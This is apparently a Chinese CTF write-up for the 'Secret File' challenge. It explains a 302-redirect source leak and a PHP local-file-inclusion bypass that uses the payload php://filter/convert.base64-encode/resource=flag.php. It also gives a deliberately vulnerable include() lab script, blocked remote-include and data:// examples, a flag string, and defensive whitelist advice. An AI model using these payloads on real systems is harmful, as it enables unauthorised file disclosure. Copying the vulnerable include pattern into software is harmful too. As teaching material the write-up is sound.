---
title: "[极客大挑战 2019] Secret File：源码注释、302 跳转与 php://filter"
date: 2026-10-30 09:00:00
updated: 2026-10-30 09:00:00
categories:
  - CTF
  - Web
  - 文件包含
tags:
  - 文件包含
  - php://filter
  - 伪协议
  - 源码泄露
  - 极客大挑战
description: 首页源码里藏着 Archive_room.php，SECRET 按钮又被 302 跳转藏住了响应体。用 Burp 看穿跳转、读到 secr3t.php 源码后，再用 php://filter 把 flag.php 以 base64 读出来。
difficulty: 入门
topic: 文件包含
series: 文件包含
series_order: 1
permalink: 2026/10/30/web-ctf-file-inclusion-secret-file/
---

{% note primary %}
**一分钟速览**

- **难度**：入门
- **考点**：源码泄露、HTTP 302 跳转、PHP 文件包含、`php://filter` 伪协议
- **关键 payload**：`?file=php://filter/convert.base64-encode/resource=flag.php`
- **一句话思路**：别让 PHP 执行 `flag.php`，先让 `php://filter` 把它编码成 base64，再 `include`，这样回显的就是源码。
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：会用浏览器看源码（F12 / `Ctrl+U`）、知道 HTTP 302 是重定向、见过 PHP 的 `include`
- **工具**：浏览器、Burp Suite（没有就用 `curl -i`）、CyberChef 或系统自带的 `base64`
- **环境**：文中的靶场地址是当时的临时环境，现在多半已失效。文末给了一个**本地复现实验**，照着搭一遍也能完整走通。
- 本文所有测试仅用于**授权靶场和本地环境**，请勿对未授权的站点进行任何测试。
{% endnote %}

{% note default %}
**做题路线**

`看首页` → `看源码找链接` → `点 SECRET 被 302` → `Burp 看响应体注释` → `访问 secr3t.php 读源码` → `分析黑名单` → `php://filter 读 flag.php` → `base64 解码`
{% endnote %}

## 第一步：先看首页

打开靶场，页面只有黑底红字：

![Secret File 首页](01-index.png)

*图 1：首页只有两句话，没有输入框，也没有明显的功能点*

这种页面第一反应不是“找输入框”，而是**看源码**。浏览器里按 `F12`，或者直接 `Ctrl+U` 查看页面源代码，搜索 `href`：

![源码里的 Archive_room.php](02-archive-room-source.png)

*图 2：源码里有一个 `./Archive_room.php` 的链接*

{% note info %}
很多 CTF 题的第一条线索就放在源码里：被注释掉的链接、隐藏的 `display:none` 元素、开发者留下的 TODO。**先看源码，再谈别的。**
{% endnote %}

## 第二步：点 SECRET，为什么只看到“查阅结束”

访问 `Archive_room.php`，页面提示“我把他们都放在这里了，去看看吧”，下面有一个 SECRET 按钮：

![SECRET 按钮](03-secret-button.png)

*图 3：看起来点下去就能看到秘密*

点下去之后，页面却变成了：

![查阅结束](04-end-page.png)

*图 4：只有“查阅结束”，没有任何有用信息*

很多新手到这里就卡住了。其实这不是“没有内容”，而是**中间有一次跳转被浏览器自动执行了**。按钮大概率指向 `action.php`，而 `action.php` 返回了一个 `302 Found`，浏览器收到后立刻去请求 `Location` 里的 `end.php`，所以你在页面上只看到最终结果。

关键点：**302 响应里的响应体，浏览器通常不会显示，但它确实被服务器发出来了。** 中间那一步的响应体里，往往就藏着线索。

## 第三步：用 Burp 看穿 302

打开 Burp Suite，把浏览器的代理指到 Burp（默认 `127.0.0.1:8080`），开启 `Proxy → Intercept is on`，然后再点一次 SECRET：

![Burp 里的 302 响应](05-burp-302.png)

*图 5：请求 `/action.php`，响应是 `302 Found`，`Location: end.php`，响应体里有 `<!-- secr3t.php -->`*

把响应拆开看：

```http
GET /action.php HTTP/1.1
Host: <靶场地址>

HTTP/1.1 302 Found
Location: end.php
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<!--
secr3t.php
-->
</html>
```

浏览器看到 `302` 就跳走了，根本不会把这段 HTML 渲染出来。但在 Burp 里，响应体原封不动地摆在这里——注释里写着 `secr3t.php`。

{% note success %}
**没有 Burp 也能做**：用 `curl -i` 看响应头和响应体。注意**不要加 `-L`**，`-L` 会自动跟随跳转，又把中间响应藏起来了。

```bash
curl -i 'http://<靶场地址>/action.php'
```
{% endnote %}

{% note warning %}
`curl -i` 会同时打印响应头和响应体。如果响应体很长，可以配合 `--max-time` 和 `-s` 使用；重点是看 `302` 那一层的 body，而不是最终页面。
{% endnote %}

## 第四步：访问 secr3t.php，读源码

浏览器直接访问 `http://<靶场地址>/secr3t.php`，页面会把自身的源码高亮打印出来：

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file);
//flag放在了flag.php里
?>
</html>
```

逐行拆一下：

| 代码 | 作用 |
| --- | --- |
| `highlight_file(__FILE__)` | 把当前文件（`secr3t.php`）的源码高亮输出。这也是为什么你能直接看到源码 |
| `error_reporting(0)` | 关闭错误提示，`include` 失败时不会把路径、报错信息打出来 |
| `$file = $_GET['file']` | 从 URL 的 `file` 参数拿文件名 |
| `strstr($file, "../")` | 过滤目录穿越 |
| `stristr($file, "tp")` | 不区分大小写地过滤 `tp`，主要拦 `http://`、`ftp://` |
| `stristr($file, "input")` | 拦 `php://input` |
| `stristr($file, "data")` | 拦 `data://` |
| `include($file)` | 把 `$file` 指向的文件包含进来执行 |
| 注释 | 直接告诉你 flag 在 `flag.php` 里 |

把黑名单整理成表：

| 想用的路径 | 命中的黑名单 | 结果 |
| --- | --- | --- |
| `../flag.php` | `../` | `Oh no!` |
| `http://example.com/shell.txt` | `tp` | `Oh no!` |
| `php://input` | `input` | `Oh no!` |
| `data://text/plain,<?php ...?>` | `data` | `Oh no!` |
| `php://filter/...` | 无 | ✅ 通过 |

所以黑名单拦掉了目录穿越、远程包含、`php://input` 和 `data://`，但**没有拦 `php://filter`**。

## 第五步：为什么不能直接 `?file=flag.php`

先别急着构造 payload，想清楚一件事：`include` 的作用是**把目标文件当成 PHP 代码执行**，不是“显示文件内容”。

假设 `flag.php` 长这样：

```php
<?php
echo "我就在这里";
$flag = 'CTF2{...}';
```

你访问：

```text
http://<靶场地址>/secr3t.php?file=flag.php
```

`include` 会把 `flag.php` 执行一遍：页面会输出“我就在这里”，`$flag` 也被赋值了，但**没有任何一句 `echo $flag`**，所以你依然看不到 flag。

{% note warning %}
这里最容易混淆的是：
- `highlight_file()` 是**显示源码**；
- `include()` 是**执行文件**。

`flag.php` 里没有输出 `$flag`，直接包含它当然看不到 flag。我们要的是“读源码”，不是“执行它”。
{% endnote %}

## 第六步：`php://filter` 是什么

PHP 提供了一组“流包装器”（stream wrapper），用来读写各种数据源，比如 `php://input`、`php://filter`、`data://`、`http://`。`php://filter` 的特殊之处是：**它可以在读取文件时，先对内容做一次过滤/编码，再把结果交给 `include`。**

语法：

```text
php://filter/convert.base64-encode/resource=flag.php
```

拆开看：

| 部分 | 含义 |
| --- | --- |
| `php://` | PHP 内置的流包装器 |
| `filter` | 使用过滤器模式 |
| `convert.base64-encode` | 读取时先做 base64 编码 |
| `/resource=flag.php` | 真正要读的文件 |

也可以写成更明确的 `read=` 形式，效果一样：

```text
php://filter/read=convert.base64-encode/resource=flag.php
```

为什么这样就不会执行 PHP 了？

1. `include` 打开 `php://filter/...` 这个流；
2. 流先读取 `flag.php` 的原始字节；
3. `convert.base64-encode` 把这些字节编码成 base64 文本；
4. `include` 拿到的是**纯 base64 文本**，里面没有 `<?php`，所以它不会当成 PHP 执行，而是直接输出。

一句话：**先编码，再包含；包含的是文本，不是代码。**

{% note info %}
`php://filter` 不是只能 base64。常见的过滤器还有：

| 过滤器 | 作用 |
| --- | --- |
| `convert.base64-encode` | base64 编码，最常用 |
| `convert.base64-decode` | base64 解码 |
| `string.strip_tags` | 去掉 HTML/PHP 标签 |
| `convert.iconv.UTF-8.UTF-16` | 字符集转换，常用于绕过滤 |
| `zlib.deflate` / `zlib.inflate` | 压缩/解压 |

本题用 base64 最稳，因为输出是可复制的 ASCII 文本。
{% endnote %}

## 第七步：构造 payload，拿到 base64

把 `file` 参数换成：

```text
http://<靶场地址>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

页面会先显示 `secr3t.php` 自己的源码（`highlight_file` 的功劳），然后在下面输出一长串 base64：

![源码和 base64 回显](06-source-and-base64.png)

*图 6：上半部分是 `secr3t.php` 的源码，下半部分是 `flag.php` 经过 base64 编码后的内容*

把下面那串以 `PCFET0NU...` 开头的 base64 复制出来，用 CyberChef 解码：

1. 打开 [CyberChef](https://gchq.github.io/CyberChef/)；
2. 左边搜索 `From Base64`，拖到 Recipe 区；
3. 把 base64 粘贴到 Input；
4. Output 里就是 `flag.php` 的源码。

没有 CyberChef 也可以用命令行：

```bash
echo 'PCFET0NU...' | base64 -d
```

或者用 Python：

```python
import base64
print(base64.b64decode('PCFET0NU...').decode())
```

解码后可以看到：

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>
    <body style="background-color:black;">
        <h1 style="...">啊哈！你找到我了！可是你看不到我QAQ~~~</h1>
        <p style="...">
            <?php
                echo "我就在这里";
                $flag = 'CTF2{252dc718-cd94-4c4a-b119-2ba00e38e566}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>
</html>
```

flag 就在 `$flag` 里：

```text
CTF2{252dc718-cd94-4c4a-b119-2ba00e38e566}
```

{% note info %}
`$secret` 是出题人留的彩蛋/干扰项，不是 flag。做题时认准 `$flag` 或者题目要求的格式，别看到一串像密码的字符串就交。
{% endnote %}

## 第八步：本地复现实验（强烈建议）

在线靶场会失效，但这道题的原理可以在一台装了 PHP 的机器上完整复现。整个过程 5 分钟。

**1. 新建目录**

```bash
mkdir php-filter-lab
cd php-filter-lab
```

**2. 创建 `flag.php`**

```php
<?php
$flag = 'CTF2{local_test_flag}';
echo "我就在这里";
```

**3. 创建 `secr3t.php`**

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$file = $_GET['file'];
if (strstr($file, "../") || stristr($file, "tp") || stristr($file, "input") || stristr($file, "data")) {
    echo "Oh no!";
    exit();
}
include($file);
```

**4. 启动 PHP 内置服务器**

```bash
php -S 127.0.0.1:8000
```

**5. 依次访问这三个 URL，观察区别**

```text
http://127.0.0.1:8000/secr3t.php
http://127.0.0.1:8000/secr3t.php?file=flag.php
http://127.0.0.1:8000/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

你会看到：

| URL | 页面表现 | 原因 |
| --- | --- | --- |
| 不带 `file` | 显示 `secr3t.php` 源码 + 一个 warning | `$file` 为空，`include` 失败 |
| `?file=flag.php` | 显示“我就在这里”，没有 flag | `include` 执行了 PHP，但没有 `echo $flag` |
| `?file=php://filter/...` | 显示一长串 base64 | 先编码再包含，源码被当文本输出 |

**6. 解码最后那串 base64**

```bash
echo '<粘贴 base64>' | base64 -d
```

你应该能看到 `local_test_flag`。把 `flag.php` 里的内容换成任意字符串，再走一遍，整个流程就真正理解了。

{% note success %}
这个实验里最值得对比的是第 2 和第 3 个 URL：**同一个 `include`，参数不同，结果一个是“执行”，一个是“读源码”。** 想明白这一点，`php://filter` 就掌握了。
{% endnote %}

## 工具速查卡

| 工具/操作 | 用途 | 关键点 |
| --- | --- | --- |
| `F12` / `Ctrl+U` | 看页面源码 | 搜 `href`、`<!--`、`display:none` |
| Burp `Proxy → HTTP history` | 看跳转中间的请求/响应 | 找 `302`、`Location`、响应体注释 |
| `curl -i` | 命令行看响应头 + 响应体 | **不要加 `-L`** |
| CyberChef `From Base64` | 解码 base64 | 粘贴后直接看 Output |
| `base64 -d` | 命令行解码 | Linux/macOS/Git Bash 自带 |
| `php -S` | 本地起 PHP 服务 | 适合复现文件包含 |

## 新手常见问题

{% note info **Q1：为什么点 SECRET 只看到“查阅结束”？** %}
按钮请求的 `action.php` 返回了 `302`，浏览器自动跳到 `end.php`。中间响应体里的 `<!-- secr3t.php -->` 被浏览器忽略了，要用 Burp 或 `curl -i` 才能看到。
{% endnote %}

{% note info **Q2：为什么 `?file=flag.php` 看不到 flag？** %}
`include` 是执行文件，不是显示文件。`flag.php` 只给 `$flag` 赋值，没有 `echo`，所以页面上不会出现 flag。
{% endnote %}

{% note info **Q3：base64 解码后是一堆乱码？** %}
先确认你复制的是**完整**的 base64，不要带 HTML 标签、空格或换行。CyberChef 的 `From Base64` 会自动忽略空白；命令行 `base64 -d` 对换行也比较宽容。如果还是乱码，检查是不是把 `secr3t.php` 的源码也一起复制进去了。
{% endnote %}

{% note info **Q4：为什么黑名单没拦 `php://filter`？** %}
黑名单只检查 `../`、`tp`、`input`、`data` 四个子串。`php://filter` 里没有这些子串，所以能通过。黑名单是“枚举坏东西”，永远列不全。
{% endnote %}

{% note info **Q5：`strstr` 和 `stristr` 有什么区别？** %}
`strstr` 区分大小写，`stristr` 不区分。比如 `TP` 能绕过 `strstr($file,"tp")`，但绕不过 `stristr`。本题对 `tp` 用的是 `stristr`，大小写都拦。
{% endnote %}

{% note info **Q6：`error_reporting(0)` 有什么用？** %}
关掉 PHP 的错误输出。这样 `include` 失败时不会把路径、权限、文件不存在的 warning 打出来，增加盲猜难度。做题时不要指望报错给提示。
{% endnote %}

{% note info **Q7：没有 Burp 怎么办？** %}
用 `curl -i` 看响应头和响应体，或者用浏览器 F12 的 Network 面板：点 SECRET 后，在 Network 里找 `action.php` 这条请求，看它的 Response。注意不要勾选 “Preserve log” 之外的自动跳转选项，重点是看 302 那一条。
{% endnote %}

{% note info **Q8：靶场地址打不开了？** %}
这类在线靶场是临时分配的，过期就失效。用上面的本地复现实验即可，payload 和原理完全一样。
{% endnote %}

{% note info **Q9：`php://filter` 只能读文件吗？** %}
它本质是流过滤器，能读也能写，还能组合多个过滤器（用 `|` 连接）。CTF 里最常见的是 `convert.base64-encode` 读源码，以及 `convert.iconv.*` 绕过字符过滤。
{% endnote %}

{% note info **Q10：为什么 `include` 能包含 `php://filter`，`file_get_contents` 也能吗？** %}
都能。`include`、`require`、`file_get_contents`、`fopen` 这些接受文件名/流的函数，都可以用 `php://filter`。区别是 `include` 会把结果当 PHP 执行，而 `file_get_contents` 只返回字符串。
{% endnote %}

## 顺手聊聊怎么防

这道题的根因不是“黑名单没写全”，而是**把用户输入直接交给了 `include`**。正确的做法：

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **不要用用户输入做文件名** | 需要切换页面就写死映射表，例如 `?page=about` → `about.php` |
| ★★★ | **白名单校验** | 只允许 `about`、`contact` 这类固定值，其他一律拒绝 |
| ★★★ | **把敏感文件移出 Web 根目录** | `flag.php` 不该和入口文件放在同一个可访问目录 |
| ★★☆ | **`open_basedir` 限制目录** | 即使被包含，也只能读指定目录 |
| ★★☆ | **关闭远程包含** | `allow_url_include=Off`、`allow_url_fopen=Off` |
| ★★☆ | **`realpath` + 前缀检查** | 解析真实路径后，确认仍在允许的目录内 |
| ★☆☆ | **不要依赖黑名单** | 拦了 `../` 还有 `php://filter`，拦了 `tp` 还有编码/大小写/其他包装器 |

一个简单的白名单写法：

```php
$pages = [
    'about'   => __DIR__ . '/pages/about.php',
    'contact' => __DIR__ . '/pages/contact.php',
];

$key = $_GET['page'] ?? 'about';
if (!isset($pages[$key])) {
    exit('not found');
}
include $pages[$key];
```

{% note success %}
**一条原则**：文件名可以是用户选的“键”，但永远不该是用户拼的“路径”。黑名单只是补丁，白名单和“不把敏感文件放在 Web 目录”才是正解。
{% endnote %}
